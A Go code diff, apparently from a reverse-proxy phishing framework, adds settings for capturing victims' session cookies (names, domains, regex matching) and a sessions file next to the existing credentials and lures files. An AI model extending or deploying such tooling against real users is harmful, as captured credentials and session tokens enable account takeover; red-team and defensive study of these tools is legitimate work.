@@ -17,6 +17,8 @@ import (
 	kfs "github.com/knadh/koanf/providers/fs"
 )
 
+const RegexpSuffix = ",regexp"
+
 var validate = validator.New()
 
 type appConfig struct {
@@ -33,6 +35,7 @@ type appConfig struct {
 	PhishletFile         string          `koanf:"phishlet_file" validate:"required"`
 	DBType               string          `koanf:"db_type" validate:"required,oneof=file"`
 	CredsFile            string          `koanf:"creds_file"`
+	SessionsFile         string          `koanf:"sessions_file"`
 	LuresFile            string          `koanf:"lures_file"`
 	DomainNameWithPort   string
 	Phishlet             *phishletConfig
@@ -44,6 +47,15 @@ type phishletConfig struct {
 	LoginURL       string   `koanf:"login_url" validate:"required,url"`
 	JsFiles        []string `koanf:"js_files"`
 	JsFilesBody    []string
+	SessionCookies []*SessionCookieConfig `koanf:"session_cookies"`
+}
+
+// TODO validate name and domain not empty
+type SessionCookieConfig struct {
+	Name     string `koanf:"name"`
+	Domain   string `koanf:"domain"`
+	Required bool   `koanf:"required"`
+	Regexp   bool
 }
 
 type DomainMapping struct {
@@ -85,6 +97,7 @@ func newAppConfig(configs ...*configSource) (*appConfig, error) {
 		"session.expiration":  30 * time.Minute,
 		"db_type":             "file",
 		"creds_file":          "creds.jsonl",
+		"sessions_file":       "sessions.jsonl",
 		"lures_file":          "lures.yaml",
 	}, "."), nil)
 	if err != nil {
@@ -141,6 +154,12 @@ func parsePhishletConfig(fsys fs.FS, yamlFile string) (*phishletConfig, error) {
 			return nil, err
 		}
 		conf.JsFilesBody = append(conf.JsFilesBody, string(data))
+	}
+	for _, cookie := range conf.SessionCookies {
+		if strings.HasSuffix(cookie.Name, RegexpSuffix) {
+			cookie.Regexp = true
+			cookie.Name = strings.TrimSuffix(cookie.Name, RegexpSuffix)
+		}
 	}
 	return &conf, err
 }
